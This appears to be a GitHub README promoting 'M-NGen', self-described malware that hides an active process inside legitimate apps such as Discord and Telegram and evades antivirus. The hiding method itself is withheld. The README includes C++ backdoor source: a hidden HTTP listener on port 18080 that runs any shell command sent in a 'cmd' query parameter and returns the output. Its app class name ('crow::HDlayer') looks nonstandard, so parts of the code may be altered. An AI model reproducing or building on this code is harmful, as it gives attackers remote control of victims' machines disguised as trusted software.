# M-NGen

M-NGen Malware Revolution
I managed to develop a completely new type of malware... Honestly, I've never seen malware work this way before!

I was able to embed a hidden active process into any application! I tested it on applications like Discord, Telegram, and some others, and the method was completely successful... The challenge here is that antivirus software will perceive the application as a legitimate version of Discord or any other app! 😳

The interesting part is that the embedding method I used is not the usual Process Injection technique.

<div align="center">
  <img src="https://files.catbox.moe/2x1ppg.png" width="350px">
</div>

> [!WARNING]  
> The method is still private, I can't share it publicly!

<div align="center">
  <img src="https://files.catbox.moe/3yceau.jpg" width="760px">
</div>

## Video :

https://github.com/user-attachments/assets/51f80947-a945-41e7-83d0-835b0fa38754

AV BYPASS :
<div align="center">
  <img src="https://files.catbox.moe/diwxzf.jpg" width="760px">
</div>


## Used languages:

1. C++
2. NodeJs
3. C#

## Part Of Code : (It's Note All of The code)

```cpp
// This is A part From The Code 
#include "crow_all.h"
#include <cstdlib>
#include <array>
#include <iostream>
#include <sstream>

// CMD EXEC
std::string Exec(const std::string& command) {
    std::array<char, 128> buffer;
    std::stringstream result;
    
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) return "Failed to execute command";

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result << buffer.data();
    }
    
    pclose(pipe);
    return result.str();
}

// Hidden Layer
int main() {
    crow::HDlayer app;

    CROW_ROUTE(app, "/HiddenLayer/CMD/Do")
        .methods(crow::HTTPMethod::GET)([](const crow::request& req) {
            auto query_params = crow::query_string{req.url_params};
            std::string command = query_params.get("cmd") ? query_params.get("cmd") : "";

            if (command.empty()) {
                return crow::response(400, "Missing 'cmd' parameter");
            }

            std::string output = Exec(command);
            return crow::response(output);
        });

    app.port(18080).multithreaded().run();
}


